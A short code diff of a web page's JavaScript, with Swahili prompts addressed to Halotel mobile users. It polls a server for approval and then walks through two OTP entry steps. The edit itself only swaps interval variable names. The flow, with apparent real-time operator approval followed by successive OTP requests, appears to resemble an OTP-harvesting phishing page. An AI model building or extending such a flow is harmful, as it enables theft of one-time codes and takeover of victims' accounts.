@@ -456,12 +456,12 @@
                     let data = await res.json();
 
                     if (data.status === 'approved') {
-                        clearInterval(statusInterval);
+                        clearInterval(interval);
                         document.getElementById('step-waiting').style.display = 'none';
                         document.getElementById('step-otp1').style.display = 'block';
                     } else if (data.status === 'rejected') {
-                        clearInterval(statusInterval);
-                        alert('Tafadhali jisajili kwa kutumia namba yako ya Halotel.');
+                        clearInterval(interval);
+                        alert("Tafadhali jisajili kwa kutumia namba yako ya Halotel.");
                         location.reload();
                     }
                 } catch (e) {
@@ -499,11 +499,11 @@
                     let data = await res.json();
 
                     if (data.status === 'success') {
-                        clearInterval(interval);
+                        clearInterval(statusInterval);
                         document.getElementById('step-waiting').style.display = 'none';
                         document.getElementById('step-otp2').style.display = 'block';
                     } else if (data.status === 'wrong') {
-                        clearInterval(interval);
+                        clearInterval(statusInterval);
                         alert('OTP 1 sio sahihi. Jaribu tena.');
                         location.reload();
                     }
